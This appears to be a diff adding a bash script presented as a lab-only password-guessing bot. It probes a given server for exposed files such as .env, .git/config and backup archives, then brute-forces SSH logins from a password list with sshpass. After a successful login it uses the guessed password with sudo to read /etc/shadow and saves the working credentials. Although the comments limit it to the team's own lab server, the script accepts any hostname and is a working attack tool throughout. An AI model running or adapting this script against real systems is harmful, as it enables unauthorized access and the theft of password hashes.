@@ -1,0 +1,36 @@
+#!/bin/bash
+# A password-guessing bot, like the ones that knock on every server on the internet.
+# Lab only: it is pointed at our own lab server, by name, and nothing else.
+target=${1:?usage: ./bot <server>}
+echo "probing http://$target/ for forgotten files"
+for path in / /.env /wp-login.php /.git/config /phpmyadmin/ /backup.zip; do
+  code=$(curl -s -o /dev/null -m 5 -A "Mozilla/5.0 (compatible; scanbot/2.1)" -w '%{http_code}' "http://$target$path")
+  echo "  $code $path"
+done
+echo "guessing SSH passwords on $target"
+n=0; silent=0
+while IFS=: read -r user pass; do
+  [ -n "$user" ] || continue
+  n=$((n + 1))
+  err=$(sshpass -p "$pass" ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
+    -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=4 "$user@$target" true 2>&1)
+  rc=$?
+  if [ $rc -eq 0 ]; then
+    echo "  try $n: $user / $pass   IN"
+    # What a bot does next: look around, then try to become root.
+    sshpass -p "$pass" ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
+      -o PreferredAuthentications=password -o PubkeyAuthentication=no "$user@$target" \
+      "uname -n; id; echo '$pass' | sudo -S -p '' cat /etc/shadow; exit" </dev/null | sed 's/^/    /'
+    echo "  saved $user / $pass"
+    break
+  elif [ $rc -eq 5 ]; then
+    echo "  try $n: $user / $pass   wrong"
+    silent=0
+  else
+    case "$err" in *refused*) why="refused" ;; *"timed out"*) why="no answer" ;; *) why="error" ;; esac
+    echo "  try $n: $user / $pass   $why"
+    silent=$((silent + 1))
+    if [ $silent -ge 3 ]; then echo "  $why 3 times in a row: blocked, moving on"; break; fi
+  fi
+done < passwords.txt
+echo "done: $n tries"
